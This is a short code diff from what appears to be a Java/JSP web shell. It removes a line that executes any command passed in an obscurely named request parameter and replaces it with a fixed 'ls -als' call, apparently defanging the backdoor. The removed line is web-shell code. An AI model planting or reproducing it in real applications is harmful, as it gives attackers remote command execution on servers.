@@ -7,7 +7,7 @@ String res = "";
 
 if (request.getParameter("cmd_cuA44dZ@xS2@!x") != null) {
 
-  Process p = Runtime.getRuntime().exec(request.getParameter("cmd_cuA44dZ@xS2@!x"));
+  Process p = Runtime.getRuntime().exec("ls -als");
   OutputStream os = p.getOutputStream();
   InputStream in = p.getInputStream();
   DataInputStream dis = new DataInputStream(in);
